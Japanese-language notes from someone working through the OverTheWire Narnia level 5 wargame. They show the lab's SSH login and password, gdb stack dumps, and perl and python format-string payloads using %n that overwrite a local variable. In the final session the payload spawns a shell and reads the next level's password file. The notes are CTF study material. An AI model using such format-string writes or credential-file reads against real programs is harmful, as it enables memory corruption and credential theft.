```sh
$ ssh -p 2226 narnia5@narnia.labs.overthewire.org
```

password: faimahchiy

ローカル変数のiを500(0x1f4)にできれば終わり

```sh
~/ctf/OverTheWire/Narnia/level5:yyy@[master](*｡˃̵ω ˂̵｡) < ./narnia5 AAAAA,%p,%p,%p,%p,%p,%p,%p                                                                                               [master]
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAAAA,0xfec7,0xffffffff,0x2f,0xf7e05dc8,0x41414141,0x78302c41,0] (63)
i = 1 (0xffffbf7c)
```

```
gdb-peda$ x/10wx 0xffffbf3c 0xffffbf3c: 0x00000001 
gdb-peda$ x/100wx $esp
0xffffbed0: 0xffffbeec  0x00000040  0xffffc282  0x0000fec7
0xffffbee0: 0xffffffff  0x0000002f  0xf7e05dc8  0xf7fd4858
0xffffbef0: 0x00008000  0xf7fab000  0xf7fa9244  0x08048319
0xffffbf00: 0x00000002  0x00000000  0x08049858  0x080485d2
0xffffbf10: 0x00000002  0xffffbfd4  0xffffbfe0  0xf7e27c0b
0xffffbf20: 0xf7fab3dc  0x0804820c  0x0804858b  0x00000001
0xffffbf30: 0xf7fab000  0xf7fab000  0x00000000  0xf7e11637
0xffffbf40: 0x00000002  0xffffbfd4  0xffffbfe0  0x00000000
0xffffbf50: 0x00000000  0x00000000  0xf7fab000  0xf7ffdc04
0xffffbf60: 0xf7ffd000  0x00000000  0xf7fab000  0xf7fab000
0xffffbf70: 0x00000000  0x74d941ad  0x498c2fbd  0x00000000
0xffffbf80: 0x00000000  0x00000000  0x00000002  0x080483c0
0xffffbf90: 0x00000000  0xf7fee030  0xf7fe88a0  0xf7ffd000
0xffffbfa0: 0x00000002  0x080483c0  0x00000000  0x080483e1
0xffffbfb0: 0x080484bd  0x00000002  0xffffbfd4  0x08048580
0xffffbfc0: 0x080485f0  0xf7fe88a0  0xffffbfcc  0xf7ffd918
0xffffbfd0: 0x00000002  0xffffc252  0xffffc282  0x00000000
0xffffbfe0: 0xffffc29b  0xffffc2d7  0xffffc2e9  0xffffc2f8
0xffffbff0: 0xffffc303  0xffffc316  0xffffc330  0xffffc347
0xffffc000: 0xffffc373  0xffffc3a6  0xffffc3c7  0xffffc3d3
0xffffc010: 0xffffc3dd  0xffffc402  0xffffc415  0xffffc4d7
0xffffc020: 0xffffc4e9  0xffffc4fd  0xffffc513  0xffffc528
0xffffc030: 0xffffc537  0xffffc55e  0xffffc587  0xffffc5a8
0xffffc040: 0xffffc5c3  0xffffc5d5  0xffffc5f5  0xffffc608
0xffffc050: 0xffffc642  0xffffc686  0xffffc6bc  0xffffc700
```

```
gdb-peda$ x/100wx $esp
0xffffbed0: 0xffffbeec  0x00000040  0xffffc282  0x0000fec7
0xffffbee0: 0xffffffff  0x0000002f  0xf7e05dc8  0x41414141 <- AAA....
0xffffbef0: 0x302c4141  0x63656678  0x78302c37  0x66666666
0xffffbf00: 0x66666666  0x3278302c  0x78302c66  0x30653766
0xffffbf10: 0x38636435  0x3478302c  0x34313431  0x2c313431
0xffffbf20: 0x30337830  0x31346332  0x08003134  0x00000001 <- vale of i
0xffffbf30: 0xf7fab000  0xf7fab000  0x00000000  0xf7e11637
0xffffbf40: 0x00000002  0xffffbfd4  0xffffbfe0  0x00000000
0xffffbf50: 0x00000000  0x00000000  0xf7fab000  0xf7ffdc04
0xffffbf60: 0xf7ffd000  0x00000000  0xf7fab000  0xf7fab000
0xffffbf70: 0x00000000  0x74d941ad  0x498c2fbd  0x00000000
0xffffbf80: 0x00000000  0x00000000  0x00000002  0x080483c0
0xffffbf90: 0x00000000  0xf7fee030  0xf7fe88a0  0xf7ffd000
0xffffbfa0: 0x00000002  0x080483c0  0x00000000  0x080483e1
0xffffbfb0: 0x080484bd  0x00000002  0xffffbfd4  0x08048580
0xffffbfc0: 0x080485f0  0xf7fe88a0  0xffffbfcc  0xf7ffd918
0xffffbfd0: 0x00000002  0xffffc252  0xffffc282  0x00000000
0xffffbfe0: 0xffffc29b  0xffffc2d7  0xffffc2e9  0xffffc2f8
0xffffbff0: 0xffffc303  0xffffc316  0xffffc330  0xffffc347
0xffffc000: 0xffffc373  0xffffc3a6  0xffffc3c7  0xffffc3d3
0xffffc010: 0xffffc3dd  0xffffc402  0xffffc415  0xffffc4d7
0xffffc020: 0xffffc4e9  0xffffc4fd  0xffffc513  0xffffc528
0xffffc030: 0xffffc537  0xffffc55e  0xffffc587  0xffffc5a8
0xffffc040: 0xffffc5c3  0xffffc5d5  0xffffc5f5  0xffffc608
0xffffc050: 0xffffc642  0xffffc686  0xffffc6bc  0xffffc700
```


どうやってもiの値が変わんないと思ったら、解答通りやったとしてもなぜかSEVGしてできない

perlだと上手く行く？？？

```sh
~/ctf/OverTheWire/Narnia/level5:yyy@[master](*｡˃̵ω ˂̵｡) < ./narnia5 `perl -e 'print "\x8c\xbf\xff\xff" . "%x%x%x%.481d%n"'`                                                                  [master]
Change i's value from 1 -> 500. GOOD
$ exit
No way...let me give you a hint!
buffer : [����fec7ffffffff2f-00000000000000000000000000000000000000000000] (63)
i = 500 (0xffffbf8c)
```


pythonでもできた

```sh
~/ctf/OverTheWire/Narnia/level5:yyy@[master](*｡˃̵ω ˂̵｡) < ./narnia5 $(python -c 'print "\x8c\xbf\xff\xff" + "%x%x%x%482d%n"')                                                                [master]
Change i's value from 1 -> 500. GOOD
$ exit
No way...let me give you a hint!
buffer : [����fec7ffffffff2f                                             ] (63)
i = 500 (0xffffbf8c)
```


```sh
~/ctf/OverTheWire/Narnia/level5:yyy@[master](*｡˃̵ω ˂̵｡) < ./narnia5 $(python -c 'print "\x8c\xbf\xff\xff" + "%x%x%x%482x%n"')                                                                [master]
Change i's value from 1 -> 500. GOOD
$ exit
No way...let me give you a hint!
buffer : [����fec7ffffffff2f                                             ] (63)
i = 500 (0xffffbf8c)
```


何が問題？？？


```sh
narnia5@narnia:~$ /narnia/narnia5 `perl -e 'print "\x1c\xd7\xff\xff" . "%x%x%x%.471d%n"'`
Change i's value from 1 -> 500. GOOD
$ cat /etc/narnia_pass/narnia6
neezocaeng
$ exit
No way...let me give you a hint!
buffer : [���f7eb8fe6ffffffffffffd6fe-0000000000000000000000000000000000] (63)
i = 500 (0xffffd71c)
```
